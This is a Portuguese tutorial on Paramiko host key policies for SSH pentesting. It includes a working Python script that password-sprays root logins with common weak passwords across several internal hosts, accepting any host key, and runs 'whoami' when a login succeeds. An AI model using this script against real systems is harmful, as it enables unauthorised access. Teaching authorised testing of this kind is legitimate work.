# Paramiko em Testes de Invasão SSH 

**Data de Publicação:** 18 de Agosto de 2025  
**Autora:** Patrícia Canossa Gagliardi
**Ferramenta de Análise**: [`Paramiko`](https://www.paramiko.org/)
---

### **1. Introdução**

A automação é um pilar fundamental nos testes de invasão modernos. Ferramentas e scripts customizados permitem a execução de tarefas repetitivas em larga escala, como varreduras de rede, enumeração de serviços e ataques de força bruta. A biblioteca **Paramiko** para Python é uma das escolhas mais populares para interagir com o protocolo SSH.

Um dos primeiros obstáculos ao automatizar interações SSH é a **verificação da chave de host (host key)**. Este mecanismo de segurança, essencial para prevenir ataques **Man-in-the-Middle (MitM)**, pode interromper um script ao tentar se conectar a um servidor desconhecido. O método `set_missing_host_key_policy` do `Paramiko` oferece o controle necessário para lidar com essa situação.

Este artigo explora como e por que um pentester utilizaria essa funcionalidade, detalhando suas políticas e os riscos de segurança inerentes.

---

### **2. O Mecanismo de Verificação de Chave de Host SSH 🛡️**

Quando um cliente SSH se conecta a um servidor pela primeira vez, o servidor apresenta sua chave de host pública, que funciona como uma *"impressão digital"* ou um *"RG" digital*. O cliente então pergunta ao usuário se ele confia naquela chave. Se o usuário aceita, a chave é armazenada localmente, geralmente no arquivo `~/.ssh/known_hosts`.

Em conexões futuras, o cliente compara a chave apresentada pelo servidor com a que está armazenada.
* **Se as chaves corresponderem**, a conexão prossegue.
* **Se as chaves não corresponderem**, o cliente emite um alerta severo, pois isso pode indicar um ataque MitM.
* **Se o host for desconhecido (não está no `known_hosts`)**, o cliente solicita a verificação manual.

É exatamente este último ponto que o `Paramiko`, por padrão, trata como um erro, levantando uma exceção do tipo `SSHException` para forçar uma prática segura.

---

### **3. As Políticas do `set_missing_host_key_policy`**

O método `ssh.set_missing_host_key_policy()` permite ao desenvolvedor substituir o comportamento padrão. Ele aceita uma instância de uma classe de política. As principais são:

* **`RejectPolicy` (Padrão):**
    * **Ação:** Rejeita automaticamente a conexão com um host desconhecido, levantando uma exceção `SSHException`.
    * **Uso:** É a política mais segura e deve ser usada em qualquer aplicação de produção onde a identidade dos servidores é conhecida e estável.

* **`AutoAddPolicy`:**
    * **Ação:** Adiciona automaticamente a chave do host desconhecido ao arquivo `known_hosts` em memória e continua com a conexão. Não há nenhuma verificação.
    * **Uso:** Extremamente útil em **pentests para automação**, mas completamente insegura para uso geral.

* **`WarningPolicy`:**
    * **Ação:** Similar à `AutoAddPolicy`, mas emite um aviso (`warning`) para o log antes de adicionar a chave.
    * **Uso:** Um meio-termo que ainda permite a conexão automática, mas torna a ação de adicionar uma nova chave mais visível nos logs do script.

---

### **4. Aplicação em Cenários de Pentest 🕵️‍♂️**

Um pentester precisa de eficiência. Interromper um script de força bruta que testa credenciais em 200 hosts apenas para aprovar manualmente cada nova chave SSH é inviável. É aqui que `AutoAddPolicy` se torna uma ferramenta poderosa.

#### **Cenário 1: Brute Force ou Password Spraying em Múltiplos Alvos**

Imagine um script que testa uma lista de senhas fracas contra uma lista de IPs de servidores SSH descobertos na rede interna.

```python
import paramiko
import warnings

# Ignorar avisos de criptografia de baixo nível que o Paramiko pode gerar
warnings.filterwarnings(action='ignore', module='.*paramiko.*')

# Lista de alvos e credenciais
targets = ["192.168.1.101", "192.168.1.105", "192.168.1.112"]
username = "root"
passwords = ["root", "toor", "password", "123456"]

for host in targets:
    for password in passwords:
        try:
            ssh = paramiko.SSHClient()
            
            # Essencial para automação: aceita qualquer host desconhecido.
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            print(f"[*] Tentando conectar em {host} com user: {username} pass: {password}")
            ssh.connect(host, port=22, username=username, password=password, timeout=5)
            
            print(f"[+] SUCESSO! Credenciais válidas encontradas para {host}: {username}:{password}")
            
            # Executa um comando para confirmar o acesso
            stdin, stdout, stderr = ssh.exec_command("whoami")
            print(f"    |_ Resultado do comando 'whoami': {stdout.read().decode().strip()}")
            
            ssh.close()
            break # Para de testar senhas para este host
            
        except paramiko.AuthenticationException:
            print(f"[-] Falha na autenticação para {host} com a senha: {password}")
        except Exception as e:
            print(f"[!] Erro ao conectar em {host}: {e}")
            break # Para de testar senhas se o host estiver offline
    print("-" * 30)